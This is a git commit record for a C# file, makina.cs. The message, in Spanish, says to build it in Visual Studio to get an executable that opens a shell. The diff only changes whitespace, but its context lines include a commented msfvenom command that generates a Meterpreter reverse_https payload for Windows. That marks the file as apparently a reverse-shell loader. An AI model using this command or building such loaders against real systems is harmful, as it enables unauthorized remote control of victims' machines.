4845a4bc571030554e0943669f3c64cc83bba441
boti <75479724+botiGit@users.noreply.github.com>
2021-07-25 14:26:16 +0200

    Update makina.cs
    Hay que buildearlo con VS, creará un ejecutable que es el que hay que ejecutar para que nos de la shell.

--- makina.cs
+++ makina.cs
@@ -4,7 +4,7 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Diagnostics;
-using System.Runtime.InteropServices;
+using System.Runtime.InteropServices; 
 
 
 //msfvenom -p windows/x64/meterpreter/reverse_https LHOST= LPORT=443 -f csharp
